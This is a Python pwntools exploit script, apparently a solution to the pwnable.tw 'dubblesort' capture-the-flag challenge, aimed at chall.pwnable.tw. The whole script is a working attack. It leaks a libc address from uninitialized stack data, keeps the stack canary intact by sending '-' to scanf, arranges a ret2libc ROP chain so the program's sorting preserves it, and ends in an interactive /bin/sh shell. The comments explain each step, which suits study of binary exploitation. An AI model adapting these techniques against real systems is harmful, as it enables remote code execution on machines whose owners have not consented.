#!/usr/bin/env python3

# NOTE: May not always work because the uint32_t value of the canary may be greater than that of the ROP gadgets
# upon which the sorting done by the program will dislocate the stack canary causing the canary check to fail and
# the program aborting. 

from pwn import *

import os
os.chdir("./patched")

exe = ELF("./dubblesort_patched")
libc = ELF("./libc.so.6")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10101)

    return r


def main():
    r = conn()

    # Get leaks based on C string printing (exact offset can be found using gdb / brute-forcing remote and comparing to local)
    # - For me, likely because the environments are different, the place on the stack where the libc addr leak occurs in local and remote differs
    if args.LOCAL: 
        r.sendafter(b'name :', b'A'*25)
    else: 
        r.sendafter(b'name :', b'A'*29)
    leak_str = r.readuntil(b'How')
    log.info(f"{leak_str=}")
    if args.LOCAL:
        libc.address = u32(b'\x00' + leak_str[31:34]) - 0x1b0000
    else:
        libc.address = u32(b'\x00' + leak_str[35:38]) - 0x1b0000
    log.info(f"{hex(libc.address)=}")


    # For the following parts, notice that it could have been simplified to a bunch of 1's, a minus sign, a bunch of libc.sym.system's
    # and finally the addr of /bin/sh\x00. However, this is fleshed out to better explain the thought process. 

    # Construct ret2libc ROP chain
    rop = ROP(libc)
    rop.system(next(libc.search(b"/bin/sh\x00")))
    print(rop.dump())

    # Replace the retaddr portion of the ROP chain with the same value as the addr of system() so that the order remains when sorted
    # and convert rop_chain to an uint32_t array
    rop_chain = rop.chain()
    rop_chain = [u32(rop_chain[:4]), libc.sym.system, u32(rop_chain[8:])]
    log.info(f"{rop_chain=}")

    # Inject the ROP chain
    # - The most important part to note about this ROP chain is that providing '-' as input to scanf("%u", addr) leaves addr untouched.
    #   This allows the canary to remain untouched. 
    r.sendlineafter(b'sort :', str(((0x7c-0x1c)+0x20+0xc)//4).encode()) # Canary is at $esp+0x7c, we starting writing ints into $esp+0x1c, retaddr is 0x20 after the canary, and the ROP chain is of length 0xc
    for i in range((0x7c-0x1c)//4):
        r.sendline(b'1') # Fill the stack up till the canary
    r.sendline(b'-') # Do not overwrite the canary - leave it as is
    for i in range(0x20//4 - 1): # Minus 1 because of the canary sendline
        r.sendline(str(libc.sym.system).encode()) # Use libc.sym.system so that it is likely bigger than the canary but <= the first ROP gadget
    for i in range(3):
        r.sendline(str(rop_chain[i]).encode())
    
    r.interactive()


if __name__ == "__main__":
    main()
